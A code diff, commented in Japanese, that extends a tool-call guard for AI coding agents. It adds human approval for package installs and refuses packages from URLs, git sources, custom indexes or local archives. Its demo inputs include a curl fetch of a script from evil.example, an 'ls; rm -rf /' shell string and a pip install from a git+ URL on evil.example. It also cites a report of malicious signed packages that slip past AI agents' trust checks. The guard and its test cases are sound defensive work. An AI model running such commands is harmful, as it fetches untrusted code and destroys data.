@@ -17,6 +17,12 @@
     したら拒否。
   - コマンド実行: シェルを通さない引数リストだけを受け付け、許可したプログラム以外は拒否。許可した
     プログラムでも、必ず人間の承認が必要。
+  - パッケージの追加・ダウンロードして実行(pip・npm・uv・npx など。`python -m pip` を含む。2026-11-14追加):
+    サプライチェーンの経路なので、承認の画面で目立たせる(名前の綴り・提供元・版の確認を促す)。
+    入手先が、通常のレジストリ以外(URL・git+・別のインデックスやレジストリの指定・ローカルのアーカイブ)の
+    ものは、人間の承認の対象にもせず拒否する。GTIGの2026年9月のレポートは、盗まれたトークンで、有効な
+    署名つき証明(SLSA)つきの悪性パッケージが公開され、AIコーディングエージェントの自動の信頼チェックを
+    通ることを報告している。署名や証明があっても、信頼の根拠にしない。
   - 書き込み系: 必ず人間の承認が必要。承認する人がいない(非対話)場合は拒否。
 すべての判断は、scripts/audit_log.py の改ざん検知つき監査ログに残せる。
 
@@ -36,6 +42,7 @@ import importlib.util
 import ipaddress
 import json
 import os
+import re
 import socket
 import sys
 from urllib.parse import urlsplit
@@ -62,6 +69,17 @@ DEFAULT_TOOLS = {
 }
 DEFAULT_ALLOWED_PROGRAMS = ("git", "ls", "dir", "python", "python3")
 MAX_TEXT = 100_000
+
+# パッケージの追加・ダウンロードして実行する系のコマンド(サプライチェーンの経路。2026-11-14追加)
+PACKAGE_MANAGERS = {"pip", "pip3", "pipx", "uv", "poetry", "npm", "pnpm", "yarn", "bun", "cargo", "go", "gem",
+                    "composer", "apt", "apt-get", "dnf", "yum", "brew", "choco", "winget", "dotnet", "nuget"}
+RUN_PACKAGE_TOOLS = {"npx", "uvx", "bunx"}  # ダウンロードして、そのまま実行する
+INSTALL_VERBS = {"install", "add", "i", "get", "require"}
+UNSAFE_FLAGS = {"--index-url", "--extra-index-url", "--find-links", "--trusted-host", "--registry", "--proxy",
+                "--allow-unauthenticated", "--no-verify"}
+PIP_STYLE = {"pip", "pip3", "pipx", "uv", "poetry"}  # -i / -f が、インデックス / find-links の意味になる
+UNSAFE_SOURCE_PREFIXES = ("git+", "github:", "gitlab:", "bitbucket:", "git@", "ssh:", "file:")
+UNSAFE_ARCHIVE_SUFFIXES = (".whl", ".tar.gz", ".tgz", ".zip", ".tar", ".deb", ".rpm")
 
 
 class Decision:
@@ -143,6 +161,42 @@ class ToolGuard:
                 return Decision(DENY, "内部向けのアドレス(%s → %s)へのアクセスです(SSRFの可能性)" % (host, ip))
         return Decision(ALLOW, "外部の通常アドレスです(接続先はresolvedのアドレスに固定すること)", addrs)
 
+    @staticmethod
+    def _package_command(argv):
+        """パッケージ管理のコマンドなら (管理ツール名, 追加・実行系か, 危険な入手先の理由 or None) を返す。違えば None。"""
+        prog = os.path.basename(argv[0]).lower()
+        if prog.endswith(".exe"):
+            prog = prog[:-4]
+        args = list(argv[1:])
+        if prog.startswith("python"):
+            if len(args) >= 2 and args[0] == "-m" and args[1] in ("pip", "pipx", "uv"):
+                manager, args = args[1], args[2:]
+            else:
+                return None
+        elif prog in PACKAGE_MANAGERS or prog in RUN_PACKAGE_TOOLS:
+            manager = prog
+        else:
+            return None
+        words = [a for a in args if not a.startswith("-")]
+        sub = words[0].lower() if words else ""
+        install_like = (manager in RUN_PACKAGE_TOOLS or sub in INSTALL_VERBS
+                        or (manager == "uv" and sub in ("pip", "tool") and len(words) > 1 and words[1].lower() in INSTALL_VERBS)
+                        or (manager in ("npm", "pnpm", "yarn", "bun") and sub in ("dlx", "exec"))
+                        or (manager == "pipx" and sub in ("run", "install"))
+                        or (manager == "dotnet" and sub == "add"))
+        unsafe = None
+        for a in args:
+            low = a.lower()
+            flag = low.split("=", 1)[0]
+            if flag in UNSAFE_FLAGS or (manager in PIP_STYLE and flag in ("-i", "-f")):
+                unsafe = "別のインデックス・レジストリ・プロキシなどの指定(%s)" % flag
+                break
+            if not a.startswith("-") and ("://" in low or low.startswith(UNSAFE_SOURCE_PREFIXES)
+                                          or low.endswith(UNSAFE_ARCHIVE_SUFFIXES)):
+                unsafe = "URL・git・ローカルのアーカイブからの入手(%s)" % a[:80]
+                break
+        return manager, install_like, unsafe
+
     def _check_argv(self, value):
         if not isinstance(value, list) or not value or not all(isinstance(x, str) for x in value):
             return Decision(DENY, "コマンドは文字列のリスト(シェルを通さない形)で渡す必要があります")
@@ -153,6 +207,16 @@ class ToolGuard:
             prog = prog[:-4]
         if prog not in self.allowed_programs:
             return Decision(DENY, "許可していないプログラム(%s)です" % prog)
+        pkg = self._package_command(value)
+        if pkg:
+            manager, install_like, unsafe = pkg
+            if unsafe:
+                return Decision(DENY, "パッケージの入手先が、通常のレジストリ以外です: %s [%s]" % (unsafe, " ".join(value)[:200]))
+            if install_like:
+                return Decision(APPROVE, "⚠ パッケージの追加、またはダウンロードして実行(%s)です。サプライチェーンの経路になるため、"
+                                         "必ず人間の承認が必要です。名前の綴り(似た名前の偽物)・提供元・版を確認してください"
+                                         "(有効な署名や証明がついていても、盗まれたトークンで公開された悪性の版は通ります): %s"
+                                % (manager, " ".join(value)[:200]))
         return Decision(APPROVE, "コマンド実行(%s)は、必ず人間の承認が必要です" % " ".join(value)[:200])
 
     # ---- ツール呼び出し全体 ----
@@ -234,6 +298,9 @@ DEMO_CALLS = [
     ("余分な引数(権限昇格の試み)", {"name": "read_file", "arguments": json.dumps({"path": "README.md", "as_admin": True})}),
     ("許可していないプログラム", {"name": "run_command", "arguments": json.dumps({"argv": ["curl", "http://evil.example/x.sh"]})}),
     ("シェル経由の実行(文字列)", {"name": "run_command", "arguments": json.dumps({"argv": "ls; rm -rf /"})}),
+    ("パッケージの追加(承認が必要。注意書きつき)", {"name": "run_command", "arguments": json.dumps({"argv": ["python", "-m", "pip", "install", "requests"]})}),
+    ("パッケージの入手先がURL(承認の対象にもせず拒否)", {"name": "run_command", "arguments": json.dumps(
+        {"argv": ["python", "-m", "pip", "install", "git+https://evil.example/x.git"]})}),
     ("許可したプログラム(承認が必要)", {"name": "run_command", "arguments": json.dumps({"argv": ["git", "status"]})}),
     ("ファイル書き込み(承認が必要)", {"name": "write_file", "arguments": json.dumps({"path": "notes.txt", "content": "x"})}),
     ("壊れた引数", {"name": "read_file", "arguments": "{not json"}),
